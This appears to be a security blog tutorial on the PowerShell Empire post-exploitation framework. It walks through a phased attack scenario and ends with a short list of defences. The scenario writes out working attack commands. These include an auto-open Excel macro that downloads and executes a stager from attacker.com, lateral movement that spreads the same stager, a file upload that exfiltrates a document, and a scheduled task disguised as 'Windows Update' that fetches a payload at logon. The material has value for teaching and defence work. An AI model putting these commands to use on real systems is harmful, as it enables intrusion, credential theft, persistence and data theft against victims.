---
title: "Empire"
datePublished: Thu Mar 06 2025 16:47:09 GMT+0000 (Coordinated Universal Time)
cuid: cm7xkxknr000309l7fapl035d
slug: empire
tags: powershell, execution, empire, command-and-scripting-interpreter

---

**Command and Scripting Interpreter→ PowerShell→**Empire

# concept

### **Empire: A Post-Exploitation Framework for PowerShell and Python**

**Empire** is an advanced **post-exploitation framework** designed for **red teaming, penetration testing, and adversary emulation**. Originally developed as a **PowerShell-based attack framework**, it later expanded to include **Python support**, making it **cross-platform** and capable of operating on both Windows and Linux systems.

---

### **Why Attackers Use Empire**

Empire provides **stealthy, modular, and flexible** capabilities for **maintaining access, executing payloads, and controlling compromised systems**. It is widely used in **ethical hacking, penetration testing, and offensive cybersecurity operations**.

**Fileless Execution** – Runs PowerShell and Python payloads directly in memory, avoiding disk-based detection.  
**Modular Payloads** – Allows attackers to load and execute various post-exploitation modules dynamically.  
**Remote Command Execution** – Enables full command and script execution on compromised machines.  
**Credential Harvesting** – Steals user credentials using built-in Mimikatz integration.  
**Persistence & C2 Communication** – Maintains long-term access to a system through stealthy command and control (C2) channels.

---

### **How Empire Works**

**Initial Compromise**

* The attacker delivers a malicious payload via phishing, exploit kits, or PowerShell execution.
    
* <mark>The payload executes in memory to avoid antivirus detection.</mark>
    

**C2 (Command & Control) Connection**

* Empire establishes a <mark>stealthy communication channel with the attacker's C2 server.</mark>
    
* Uses HTTP, HTTPS, or other encrypted communication methods to evade detection.
    

**Post-Exploitation**

* Executes additional payloads, dumps credentials, escalates privileges, and gathers system information.
    
* <mark>Uses PowerShell or Python scripts to move laterally across the network.</mark>
    

**Persistence & Data Exfiltration**

* Maintains long-term access by creating scheduled tasks, registry modifications, or backdoor implants.
    
* Exfiltrates sensitive data to external servers.
    

---

### **Empire Modules & Capabilities**

✔ **Execution Modules** – Run PowerShell and Python scripts on compromised systems.  
✔ **Credential Theft** – Extracts passwords using Mimikatz and other credential-harvesting techniques.  
✔ **Lateral Movement** – Uses stolen credentials to move across a network.  
✔ **Privilege Escalation** – Exploits system vulnerabilities to gain higher privileges.  
✔ **Keylogging & Screen Capture** – Records keystrokes and takes screenshots from compromised hosts.  
✔ **Data Exfiltration** – Sends sensitive data to an attacker's server.

---

# PowerShell Empire Attack Scenario

This scenario demonstrates how an adversary **compromises a Windows system using PowerShell Empire**, establishes **C2 (Command & Control) communication**, and performs **post-exploitation activities** such as **privilege escalation, credential dumping, and lateral movement**.

---

## **Phase 1: Initial Compromise (Gaining Initial Access)**

### **Attack Vector: Phishing Email with Malicious PowerShell Script**

An attacker **sends a phishing email** to an employee, containing a **malicious PowerShell script** embedded in an Excel macro.

#### **Crafting the Malicious Document**

* The attacker creates an **Excel file (**`malicious_invoice.xlsm`) with a VBA macro.
    
* The macro executes an **Empire Stager payload** using PowerShell.
    

#### **Malicious VBA Macro Code (Auto-Executes on Opening)**

```bash
Sub AutoOpen()
    Dim objShell As Object
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell -exec bypass -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/EmpireStager.ps1')"
End Sub
```

* This **downloads and executes an Empire PowerShell Stager**, which connects back to the attacker’s Empire C2 server.
    

#### **The Victim Opens the Excel File**

* The **PowerShell script executes**, and **Empire establishes a connection to the attacker's C2 server**.
    
* The victim is now **compromised**.
    

---

## **Phase 2: Establishing C2 (Command & Control) Connection**

### **Setting Up the Empire C2 Server**

On the attacker's **Empire C2 server**, they set up a listener:

```powershell
listeners create http
set Host attacker.com
set Port 8080
execute
```

* This **creates an HTTP listener** on port 8080, waiting for incoming connections from infected systems.
    

### **PowerShell Stager Executes and Connects to C2**

Once the victim executes the **malicious PowerShell script**, the infected system **connects back to the attacker's C2**.  
The attacker **sees an active session** in Empire:

```powershell
(Empire) > agents
[*] Active agents:
[*] ID  Name    Hostname   Username         Process    Check-in
[*] 01  WIN10   VICTIM-PC  Victim\User  powershell.exe  3s ago
```

Now, the attacker has **full remote access** to the victim's system.

---

## **Phase 3: Post-Exploitation Activities**

### **System Reconnaissance (Discovering System Information)**

The attacker gathers system information to identify valuable targets:

```powershell
(Empire) > interact WIN10
(Empire:WIN10) > sysinfo
```

* Returns **OS version, hostname, user details, and network configuration**.
    

### **Privilege Escalation (Gaining Admin Access)**

The attacker **checks privileges** and **attempts to escalate**:

```powershell
(Empire:WIN10) > getprivs
```

* If the user **lacks admin privileges**, the attacker uses a **UAC bypass exploit**:
    

```powershell
(Empire:WIN10) > uacbypass
```

* If successful, the attacker now **operates with SYSTEM privileges**.
    

### **Credential Dumping (Stealing Passwords)**

The attacker attempts to extract **user credentials** using Mimikatz:

```powershell
(Empire:WIN10) > mimikatz
```

* Extracts **NTLM hashes** and **plaintext passwords**.
    

If hashes are obtained, the attacker can perform a **Pass-the-Hash (PtH) attack** to authenticate to other systems.

---

## **Phase 4: Lateral Movement (Spreading Through the Network)**

### **Finding Other Networked Machines**

The attacker **enumerates the network** to find additional systems:

```powershell
(Empire:WIN10) > net view
```

* Lists all **computers in the network**.
    

### **Using Stolen Credentials to Move Laterally**

If the attacker **stole admin credentials**, they use **PowerShell Remoting** to access other systems:

```powershell
(Empire:WIN10) > Invoke-Command -ComputerName TARGET-PC -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/EmpireStager.ps1') }
```

* **Executes the Empire payload on another system**, spreading the infection.
    

---

## **Phase 5: Data Exfiltration & Persistence**

### **Extracting Sensitive Files**

The attacker searches for **valuable files**:

```powershell
(Empire:WIN10) > dir C:\Users\Documents\Confidential\
```

They **exfiltrate files** via PowerShell:

```powershell
(Empire:WIN10) > Invoke-WebRequest -Uri "http://attacker.com/upload" -Method POST -InFile "C:\Users\Documents\confidential.docx"
```

* **Uploads stolen data to the attacker’s server**.
    

### **Setting Up Persistence**

To maintain access, the attacker **creates a scheduled task**:

```powershell
schtasks /create /tn "Windows Update" /tr "powershell.exe -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/persist.ps1')" /sc ONLOGON /ru SYSTEM
```

* This **executes a PowerShell payload every time the user logs in**, ensuring **long-term access**.
    

# **How to Defend Against Empire Attacks**

✔ **Disable Unnecessary PowerShell Features**

* Enable **PowerShell Constrained Language Mode** to limit dangerous commands.
    
* Use **AppLocker or WDAC (Windows Defender Application Control)** to block Empire execution.
    

✔ **Monitor PowerShell & Python Execution**

* Track suspicious PowerShell commands (`Invoke-Expression`, `IEX`, `DownloadString`).
    
* Log and analyze unusual Python script executions.
    

✔ **Implement Network Traffic Analysis**

* Detect Empire’s C2 traffic using SIEM solutions and intrusion detection systems (IDS/IPS).
    
* Block HTTP/HTTPS-based Empire communications using firewall rules.
    

✔ **Harden System Security**

* Disable **PowerShell remoting** if not needed.
    
* Enforce **multi-factor authentication (MFA)** to reduce credential theft risks.
    
* Regularly update security patches to prevent exploitation of vulnerabilities.